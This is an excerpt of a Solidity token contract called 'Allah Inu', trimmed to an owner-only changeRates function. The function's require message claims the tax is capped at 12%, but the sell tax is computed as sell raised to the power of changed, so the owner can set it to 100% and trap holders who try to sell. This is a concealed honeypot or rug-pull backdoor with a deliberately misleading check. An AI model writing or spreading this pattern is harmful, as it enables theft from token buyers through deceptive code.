...
contract ALLAH is Context, IERC20 { 
    ...
    string private constant _name = "Allah Inu"; 
    ...
    function changeRates(uint256 buy, uint256 sell, uint256 changed) public onlyOwner{
        require(sell <= 10 && buy <= 10 && changed <= 2, "Can't be more than 12% and 2% effective change");
        _Tax_On_Buy = buy;
        _Tax_On_Sell = sell**changed;
    }
